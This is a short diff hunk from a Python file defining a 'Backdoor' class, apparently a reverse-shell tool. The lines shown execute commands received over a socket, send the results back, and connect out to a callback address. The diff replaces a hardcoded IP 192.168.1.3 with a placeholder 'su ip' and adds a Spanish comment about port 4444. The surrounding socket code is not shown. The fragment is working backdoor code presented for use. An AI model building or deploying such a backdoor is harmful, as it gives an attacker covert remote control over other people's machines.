@@ -85,5 +85,5 @@ class Backdoor:
             command_result = self.execute_command(command)
             self.json_send(command_result)
 
-reverse_backdoor = Backdoor("192.168.1.3", 4444)
+reverse_backdoor = Backdoor("su ip", 4444) # 4444 seria el puerto por donde se conectara el socket
 reverse_backdoor.run()
